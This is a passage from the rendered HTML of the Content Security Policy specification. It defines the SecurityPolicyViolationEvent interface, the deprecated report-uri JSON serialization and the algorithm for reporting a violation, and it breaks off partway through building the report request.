    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString④"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-securitypolicyviolationevent-effectivedirective"><code><c- g>effectiveDirective</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString⑤"><c- b>DOMString</c-></a>      <a class="idl-code" data-link-type="attribute" data-readonly data-type="DOMString" href="#dom-securitypolicyviolationevent-violateddirective" id="ref-for-dom-securitypolicyviolationevent-violateddirective"><c- g>violatedDirective</c-></a>; // historical alias of effectiveDirective
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString⑥"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-securitypolicyviolationevent-originalpolicy"><code><c- g>originalPolicy</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString⑨"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-securitypolicyviolationevent-sourcefile"><code><c- g>sourceFile</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString⑦"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-securitypolicyviolationevent-sample"><code><c- g>sample</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition" id="ref-for-enumdef-securitypolicyviolationeventdisposition①"><c- n>SecurityPolicyViolationEventDisposition</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="SecurityPolicyViolationEventDisposition" id="dom-securitypolicyviolationevent-disposition"><code><c- g>disposition</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-short" id="ref-for-idl-unsigned-short①"><c- b>unsigned</c-> <c- b>short</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="unsigned short" id="dom-securitypolicyviolationevent-statuscode"><code><c- g>statusCode</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long②"><c- b>unsigned</c-> <c- b>long</c-></a>  <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="unsigned long" id="dom-securitypolicyviolationevent-lineno"><code><c- g>lineno</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long③"><c- b>unsigned</c-> <c- b>long</c-></a>  <a class="idl-code" data-link-type="attribute" data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-linenumber" id="ref-for-dom-securitypolicyviolationevent-linenumber"><c- g>lineNumber</c-></a>; // historical alias of lineno
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long④"><c- b>unsigned</c-> <c- b>long</c-></a>  <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="unsigned long" id="dom-securitypolicyviolationevent-colno"><code><c- g>colno</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long⑤"><c- b>unsigned</c-> <c- b>long</c-></a>  <a class="idl-code" data-link-type="attribute" data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-columnnumber" id="ref-for-dom-securitypolicyviolationevent-columnnumber"><c- g>columnNumber</c-></a>; // historical alias of colno
};

<c- b>dictionary</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="dictionary" data-export id="dictdef-securitypolicyviolationeventinit"><code><c- g>SecurityPolicyViolationEventInit</c-></code></dfn> : <a data-link-type="idl-name" href="https://dom.spec.whatwg.org/#dictdef-eventinit" id="ref-for-dictdef-eventinit"><c- n>EventInit</c-></a> {
    <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString①⓪"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="USVString" id="dom-securitypolicyviolationeventinit-documenturl"><code><c- g>documentURL</c-></code></dfn>;
             <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString①①"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="USVString" id="dom-securitypolicyviolationeventinit-referrer"><code><c- g>referrer</c-></code></dfn> = "";
             <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString①②"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="USVString" id="dom-securitypolicyviolationeventinit-blockedurl"><code><c- g>blockedURL</c-></code></dfn> = "";
    <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString⑧"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="DOMString" id="dom-securitypolicyviolationeventinit-effectivedirective"><code><c- g>effectiveDirective</c-></code></dfn>;
    <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString⑨"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="DOMString" id="dom-securitypolicyviolationeventinit-originalpolicy"><code><c- g>originalPolicy</c-></code></dfn>;
             <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString①③"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="USVString" id="dom-securitypolicyviolationeventinit-sourcefile"><code><c- g>sourceFile</c-></code></dfn> = "";
             <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString①⓪"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="DOMString" id="dom-securitypolicyviolationeventinit-sample"><code><c- g>sample</c-></code></dfn> = "";
    <c- b>required</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition" id="ref-for-enumdef-securitypolicyviolationeventdisposition②"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="SecurityPolicyViolationEventDisposition" id="dom-securitypolicyviolationeventinit-disposition"><code><c- g>disposition</c-></code></dfn>;
    <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-short" id="ref-for-idl-unsigned-short②"><c- b>unsigned</c-> <c- b>short</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="unsigned short" id="dom-securitypolicyviolationeventinit-statuscode"><code><c- g>statusCode</c-></code></dfn>;
             <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long⑥"><c- b>unsigned</c-> <c- b>long</c-></a>  <dfn class="dfn-paneled idl-code" data-default="0" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="unsigned long" id="dom-securitypolicyviolationeventinit-lineno"><code><c- g>lineno</c-></code></dfn> = 0;
             <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long⑦"><c- b>unsigned</c-> <c- b>long</c-></a>  <dfn class="dfn-paneled idl-code" data-default="0" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="unsigned long" id="dom-securitypolicyviolationeventinit-colno"><code><c- g>colno</c-></code></dfn> = 0;
};
</pre>
    <p>The <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export id="dom-securitypolicyviolationevent-documenturi"><code>documentURI</code></dfn> attribute’s
  getter must return the value of the object’s <code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-documenturl" id="ref-for-dom-securitypolicyviolationevent-documenturl">documentURL</a></code> property.</p>
    <p>The <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export id="dom-securitypolicyviolationevent-blockeduri"><code>blockedURI</code></dfn> attribute’s
  getter must return the value of the object’s <code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-blockedurl" id="ref-for-dom-securitypolicyviolationevent-blockedurl">blockedURL</a></code> property.</p>
    <p>The <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export id="dom-securitypolicyviolationevent-violateddirective"><code>violatedDirective</code></dfn> attribute’s
  getter must return the value of the object’s <code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-effectivedirective" id="ref-for-dom-securitypolicyviolationevent-effectivedirective">effectiveDirective</a></code> property.</p>
    <p>The <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export id="dom-securitypolicyviolationevent-linenumber"><code>lineNumber</code></dfn> attribute’s
  getter must return the value of the object’s <code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-lineno" id="ref-for-dom-securitypolicyviolationevent-lineno">lineno</a></code> property.</p>
    <p>The <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export id="dom-securitypolicyviolationevent-columnnumber"><code>columnNumber</code></dfn> attribute’s
  getter must return the value of the object’s <code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-colno" id="ref-for-dom-securitypolicyviolationevent-colno">colno</a></code> property.</p>
    <h3 class="heading settled" data-level="5.2" id="deprecated-serialize-violation"><span class="secno">5.2. </span><span class="content"> Obtain the deprecated serialization of <var>violation</var> </span><a class="self-link" href="#deprecated-serialize-violation"></a></h3>
    <p>Given a <a data-link-type="dfn" href="#violation" id="ref-for-violation①⑦">violation</a> (<var>violation</var>), this algorithm returns a JSON text
  string representation of the violation, suitable for submission to a reporting
  endpoint associated with the deprecated <a data-link-type="dfn" href="#report-uri" id="ref-for-report-uri"><code>report-uri</code></a> directive.</p>
    <ol>
     <li data-md>
      <p>Let <var>body</var> be a <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ordered-map" id="ref-for-ordered-map">map</a> with its keys initialized as
  follows:</p>
      <dl>
       <dt data-md>"<code>document-url</code>"
       <dd data-md>
        <p>The result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-serializer" id="ref-for-concept-url-serializer">URL serializer</a> on <var>violation</var>’s <a data-link-type="dfn" href="#violation-url" id="ref-for-violation-url">url</a>, with the <code>exclude fragment</code> flag set.</p>
       <dt data-md>"<code>document-uri</code>"
       <dd data-md>
        <p>A copy of the "<code>document-url</code>" property, kept for historical reasons</p>
       <dt data-md>"<code>referrer</code>"
       <dd data-md>
        <p>The result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-serializer" id="ref-for-concept-url-serializer①">URL serializer</a> on <var>violation</var>’s <a data-link-type="dfn" href="#violation-referrer" id="ref-for-violation-referrer①">referrer</a>, with the <code>exclude fragment</code> flag set.</p>
       <dt data-md>"<code>blocked-url</code>"
       <dd data-md>
        <p>The result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-serializer" id="ref-for-concept-url-serializer②">URL serializer</a> on <var>violation</var>’s <a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource⑧">resource</a>, with the <code>exclude fragment</code> flag set.</p>
       <dt data-md>"<code>blocked-uri</code>"
       <dd data-md>
        <p>A copy of the "<code>blocked-url</code>" property, kept for historical reasons</p>
       <dt data-md>"<code>effective-directive</code>"
       <dd data-md>
        <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-effective-directive" id="ref-for-violation-effective-directive①">effective directive</a></p>
       <dt data-md>"<code>violated-directive</code>"
       <dd data-md>
        <p>A copy of the "<code>effective-directive</code>" property, kept for historical reasons</p>
       <dt data-md>"<code>original-policy</code>"
       <dd data-md>
        <p>The <a data-link-type="dfn" href="#serialized-csp" id="ref-for-serialized-csp⑥">serialization</a> of <var>violation</var>’s <a data-link-type="dfn" href="#violation-policy" id="ref-for-violation-policy①">policy</a></p>
       <dt data-md>"<code>disposition</code>"
       <dd data-md>
        <p>The <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition①⑦">disposition</a> of <var>violation</var>’s <a data-link-type="dfn" href="#violation-policy" id="ref-for-violation-policy②">policy</a></p>
       <dt data-md>"<code>status-code</code>"
       <dd data-md>
        <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-status" id="ref-for-violation-status①">status</a></p>
       <dt data-md>"<code>script-sample</code>"
       <dd data-md>
        <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-sample" id="ref-for-violation-sample④">sample</a></p>
        <p class="note" role="note"><span class="marker">Note:</span> The name <code>script-sample</code> was chosen for compatibility with an earlier iteration of
  this feature which has shipped in Firefox since its initial implementation of CSP. Despite
  the name, this field will contain samples for non-script violations, like stylesheets. The
  data contained in a <code class="idl"><a data-link-type="idl" href="#securitypolicyviolationevent" id="ref-for-securitypolicyviolationevent">SecurityPolicyViolationEvent</a></code> object, and in reports generated via
  the new <a data-link-type="dfn" href="#report-to" id="ref-for-report-to"><code>report-to</code></a> directive, is named in a more encompassing fashion: <code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-sample" id="ref-for-dom-securitypolicyviolationevent-sample">sample</a></code>.</p>
      </dl>
     <li data-md>
      <p>If <var>violation</var>’s <a data-link-type="dfn" href="#violation-source-file" id="ref-for-violation-source-file②">source file</a> is not <code>null</code>:</p>
      <ol>
       <li data-md>
        <p>Set <var>body</var>["<code>source-file</code>"] to the result of executing
  the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-serializer" id="ref-for-concept-url-serializer③">URL serializer</a> on <var>violation</var>’s <a data-link-type="dfn" href="#violation-source-file" id="ref-for-violation-source-file③">source
  file</a>, with the <code>exclude fragment</code> flag set.</p>
       <li data-md>
        <p>Set <var>body</var>["<code>lineno</code>"] to <var>violation</var>’s <a data-link-type="dfn" href="#violation-line-number" id="ref-for-violation-line-number①">line number</a>.</p>
       <li data-md>
        <p>Set <var>body</var>["<code>line-number</code>"] to <var>violation</var>’s <a data-link-type="dfn" href="#violation-line-number" id="ref-for-violation-line-number②">line number</a>.</p>
       <li data-md>
        <p>Set <var>body</var>["<code>colno</code>"] to <var>violation</var>’s <a data-link-type="dfn" href="#violation-column-number" id="ref-for-violation-column-number①">column number</a>.</p>
       <li data-md>
        <p>Set <var>body</var>["<code>column-number</code>"] to <var>violation</var>’s <a data-link-type="dfn" href="#violation-column-number" id="ref-for-violation-column-number②">column number</a>.</p>
        <p class="note" role="note"><span class="marker">Note:</span> the "<code>line-number</code>" and "<code>column-number</code>" keys are
  maintained for historical reasons and are duplicates of "<code>lineno</code>"
  and "<code>colno</code>" respectively.</p>
      </ol>
     <li data-md>
      <p class="assertion">Assert: If <var>body</var>["<code>blocked-url</code>"] is not "<code>inline</code>", then <var>body</var>["<code>sample</code>"]
  is the empty string.</p>
     <li data-md>
      <p>Return the result of <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#serialize-an-infra-value-to-json-bytes" id="ref-for-serialize-an-infra-value-to-json-bytes">serialize an infra value to JSON bytes</a> given
  «[ "csp-report" → body ]».</p>
    </ol>
    <h3 class="heading settled algorithm" data-algorithm="Report a violation" data-level="5.3" id="report-violation"><span class="secno">5.3. </span><span class="content"> Report a <var>violation</var> </span><a class="self-link" href="#report-violation"></a></h3>
    <p>Given a <a data-link-type="dfn" href="#violation" id="ref-for-violation①⑧">violation</a> (<var>violation</var>), this algorithm reports it to the endpoint specified in <var>violation</var>’s <a data-link-type="dfn" href="#violation-policy" id="ref-for-violation-policy③">policy</a>, and fires a <code class="idl"><a data-link-type="idl" href="#securitypolicyviolationevent" id="ref-for-securitypolicyviolationevent①">SecurityPolicyViolationEvent</a></code> at <var>violation</var>’s <a data-link-type="dfn" href="#violation-element" id="ref-for-violation-element①">element</a>, or at <var>violation</var>’s <a data-link-type="dfn" href="#violation-global-object" id="ref-for-violation-global-object③">global object</a> as described below:</p>
    <ol>
     <li data-md>
      <p>Let <var>global</var> be <var>violation</var>’s <a data-link-type="dfn" href="#violation-global-object" id="ref-for-violation-global-object④">global object</a>.</p>
     <li data-md>
      <p>Let <var>target</var> be <var>violation</var>’s <a data-link-type="dfn" href="#violation-element" id="ref-for-violation-element②">element</a>.</p>
     <li data-md>
      <p><a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#queue-a-task" id="ref-for-queue-a-task">Queue a task</a> to run the following steps:</p>
      <p class="note" role="note"><span class="marker">Note:</span> We "queue a task" here to ensure that the event targeting and dispatch
  happens after JavaScript completes execution of the task responsible for a
  given violation (which might manipulate the DOM).</p>
      <ol>
       <li data-md>
        <p>If <var>target</var> is not <code>null</code>, and <var>global</var> is a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#window" id="ref-for-window②">Window</a></code>, and <var>target</var>’s <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-shadow-including-root" id="ref-for-concept-shadow-including-root">shadow-including root</a> is not <var>global</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window" id="ref-for-concept-document-window①">associated <code>Document</code></a>, set <var>target</var> to <code>null</code>.</p>
        <p class="note" role="note"><span class="marker">Note:</span> This ensures that we fire events only at elements <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#connected" id="ref-for-connected">connected</a> to <var>violation</var>’s <a data-link-type="dfn" href="#violation-policy" id="ref-for-violation-policy④">policy</a>’s <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①①">Document</a></code>. If a
  violation is caused by an element which isn’t connected to that
  document, we’ll fire the event at the document rather than the element
  in order to ensure that the violation is visible to the document’s
  listeners.</p>
       <li data-md>
        <p>If <var>target</var> is <code>null</code>:</p>
        <ol>
         <li data-md>
          <p>Set <var>target</var> be <var>violation</var>’s <a data-link-type="dfn" href="#violation-global-object" id="ref-for-violation-global-object⑤">global object</a>.</p>
         <li data-md>
          <p>If <var>target</var> is a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#window" id="ref-for-window③">Window</a></code>, set <var>target</var> to <var>target</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window" id="ref-for-concept-document-window②">associated <code>Document</code></a>.</p>
        </ol>
       <li data-md>
        <p><a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-event-fire" id="ref-for-concept-event-fire">Fire an event</a> named <code>securitypolicyviolation</code> that uses the <code class="idl"><a data-link-type="idl" href="#securitypolicyviolationevent" id="ref-for-securitypolicyviolationevent②">SecurityPolicyViolationEvent</a></code> interface at <var>target</var> with
  its attributes initialized as follows:</p>
        <dl>
         <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-documenturl" id="ref-for-dom-securitypolicyviolationevent-documenturl①">documentURL</a></code>
         <dd data-md>
          <p>The result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-serializer" id="ref-for-concept-url-serializer④">URL serializer</a> on <var>violation</var>’s <a data-link-type="dfn" href="#violation-url" id="ref-for-violation-url①">url</a>, with the <code>exclude fragment</code> flag set.</p>
         <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-referrer" id="ref-for-dom-securitypolicyviolationevent-referrer">referrer</a></code>
         <dd data-md>
          <p>The result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-serializer" id="ref-for-concept-url-serializer⑤">URL serializer</a> on <var>violation</var>’s <a data-link-type="dfn" href="#violation-referrer" id="ref-for-violation-referrer②">referrer</a>, with the <code>exclude fragment</code> flag set.</p>
         <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-blockedurl" id="ref-for-dom-securitypolicyviolationevent-blockedurl①">blockedURL</a></code>
         <dd data-md>
          <p>The result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-serializer" id="ref-for-concept-url-serializer⑥">URL serializer</a> on <var>violation</var>’s <a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource⑨">resource</a>, with the <code>exclude fragment</code> flag set.</p>
         <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-effectivedirective" id="ref-for-dom-securitypolicyviolationevent-effectivedirective①">effectiveDirective</a></code>
         <dd data-md>
          <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-effective-directive" id="ref-for-violation-effective-directive②">effective directive</a></p>
         <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-originalpolicy" id="ref-for-dom-securitypolicyviolationevent-originalpolicy">originalPolicy</a></code>
         <dd data-md>
          <p>The <a data-link-type="dfn" href="#serialized-csp" id="ref-for-serialized-csp⑦">serialization</a> of <var>violation</var>’s <a data-link-type="dfn" href="#violation-policy" id="ref-for-violation-policy⑤">policy</a></p>
         <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-disposition" id="ref-for-dom-securitypolicyviolationevent-disposition">disposition</a></code>
         <dd data-md>
          <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-disposition" id="ref-for-violation-disposition">disposition</a></p>
         <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-sourcefile" id="ref-for-dom-securitypolicyviolationevent-sourcefile">sourceFile</a></code>
         <dd data-md>
          <p>The result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-serializer" id="ref-for-concept-url-serializer⑦">URL serializer</a> on <var>violation</var>’s <a data-link-type="dfn" href="#violation-source-file" id="ref-for-violation-source-file④">source file</a>, with the <code>exclude fragment</code> flag set if the <var>violation</var>’s <a data-link-type="dfn" href="#violation-source-file" id="ref-for-violation-source-file⑤">source file</a> it not <code>null</code> and the empty string otherwise.</p>
         <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-statuscode" id="ref-for-dom-securitypolicyviolationevent-statuscode">statusCode</a></code>
         <dd data-md>
          <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-status" id="ref-for-violation-status②">status</a></p>
         <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-lineno" id="ref-for-dom-securitypolicyviolationevent-lineno①">lineno</a></code>
         <dd data-md>
          <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-line-number" id="ref-for-violation-line-number③">line number</a></p>
         <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-colno" id="ref-for-dom-securitypolicyviolationevent-colno①">colno</a></code>
         <dd data-md>
          <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-column-number" id="ref-for-violation-column-number③">column number</a></p>
         <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-sample" id="ref-for-dom-securitypolicyviolationevent-sample①">sample</a></code>
         <dd data-md>
          <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-sample" id="ref-for-violation-sample⑤">sample</a></p>
         <dt data-md><code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#dom-event-bubbles" id="ref-for-dom-event-bubbles">bubbles</a></code>
         <dd data-md>
          <p><code>true</code></p>
         <dt data-md><code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#dom-event-composed" id="ref-for-dom-event-composed">composed</a></code>
         <dd data-md>
          <p><code>true</code></p>
        </dl>
        <p class="note" role="note"><span class="marker">Note:</span> We set the <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#dom-event-composed" id="ref-for-dom-event-composed①">composed</a></code> attribute, which means that this event
  can be captured on its way into, and will bubble its way out of a shadow
  tree. <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#dom-event-target" id="ref-for-dom-event-target">target</a></code>, et al will be automagically scoped correctly for
  the main tree.</p>
       <li data-md>
        <p>If <var>violation</var>’s <a data-link-type="dfn" href="#violation-policy" id="ref-for-violation-policy⑥">policy</a>’s <a data-link-type="dfn" href="#policy-directive-set" id="ref-for-policy-directive-set⑦">directive
  set</a> contains a <a data-link-type="dfn" href="#directives" id="ref-for-directives①①">directive</a> named "<a data-link-type="dfn" href="#report-uri" id="ref-for-report-uri①"><code>report-uri</code></a>"
  (<var>directive</var>):</p>
        <ol>
         <li data-md>
          <p>If <var>violation</var>’s <a data-link-type="dfn" href="#violation-policy" id="ref-for-violation-policy⑦">policy</a>’s <a data-link-type="dfn" href="#policy-directive-set" id="ref-for-policy-directive-set⑧">directive set</a> contains a <a data-link-type="dfn" href="#directives" id="ref-for-directives①②">directive</a> named
  "<a data-link-type="dfn" href="#report-to" id="ref-for-report-to①"><code>report-to</code></a>", skip the remaining substeps.</p>
         <li data-md>
          <p>For each <var>token</var> returned by <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#split-on-ascii-whitespace" id="ref-for-split-on-ascii-whitespace①"> splitting a string on ASCII whitespace</a> with <var>directive</var>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④">value</a> as the <code>input</code>.</p>
          <ol>
           <li data-md>
            <p>Let <var>endpoint</var> be the result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-parser" id="ref-for-concept-url-parser">URL parser</a> with <var>token</var> as the input, and <var>violation</var>’s <a data-link-type="dfn" href="#violation-url" id="ref-for-violation-url②">url</a> as the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-base-url" id="ref-for-concept-base-url">base URL</a>.</p>
           <li data-md>
            <p>If <var>endpoint</var> is not a valid URL, skip the remaining substeps.</p>
           <li data-md>
            <p>Let <var>request</var> be a new <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①⑥">request</a>, initialized as follows:</p>
            <dl>
             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-method" id="ref-for-concept-request-method">method</a>
             <dd data-md>
              <p>"<code>POST</code>"</p>
             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-url" id="ref-for-concept-request-url⑤">url</a>
             <dd data-md>
              <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-url" id="ref-for-violation-url③">url</a></p>
             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-origin" id="ref-for-concept-request-origin">origin</a>
             <dd data-md>
              <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-global-object" id="ref-for-violation-global-object⑥">global object</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object" id="ref-for-relevant-settings-object">relevant settings
  object</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin" id="ref-for-concept-settings-object-origin①">origin</a></p>
             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-window" id="ref-for-concept-request-window">window</a>
             <dd data-md>
              <p>"<code>no-window</code>"</p>
             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client①④">client</a>
             <dd data-md>
